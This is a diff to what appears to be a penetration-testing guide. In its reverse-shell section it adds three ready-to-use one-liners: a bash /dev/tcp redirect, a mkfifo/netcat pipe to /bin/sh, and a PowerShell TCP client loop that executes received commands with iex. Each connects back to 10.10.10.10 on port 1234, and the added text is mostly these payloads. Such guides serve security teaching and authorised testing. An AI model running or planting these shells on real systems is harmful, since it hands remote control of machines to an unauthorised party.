@@ -40,7 +40,21 @@ group default qlen 500
 #### Step 3: Reverse Shell Command
 The command we run depends on the victims OS, and what applications we can access. [Payload All The Things](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/) has a comprehensive list of reverse shell commands that covers a wide range of compromised hosts.
 
-Here are a few examples of more reliable reverse shell co
+Here are a few examples of more reliable reverse shell commands for both Linux and Windows:
+```bash
+bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1' 
+```
+```bash
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
+```
+```powershell
+
+```
+
+```
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
+```
+
 
 ---
 ## Bind Shell
